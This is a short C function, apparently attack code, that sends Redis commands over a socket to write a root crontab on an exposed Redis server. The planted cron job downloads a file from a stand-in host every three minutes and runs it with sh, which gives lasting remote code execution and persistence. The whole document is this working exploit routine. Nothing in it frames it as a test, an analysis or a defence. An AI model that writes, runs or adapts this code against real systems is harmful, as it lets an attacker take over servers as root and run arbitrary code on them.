#include <sys/socket.h>
#include <string.h>
void plant_cron(int fd) {
    const char *commands[] = {
        "CONFIG SET dir /var/spool/cron/crontabs\r\n",
        "CONFIG SET dbfilename root\r\n",
        "SET payload \"\n\n*/3 * * * * wget -qO /tmp/job http://payload.test/job;sh /tmp/job &\n\n\"\r\n",
        "SAVE\r\n"
    };
    for (int i = 0; i < 4; i++) send(fd, commands[i], strlen(commands[i]), 0);
}
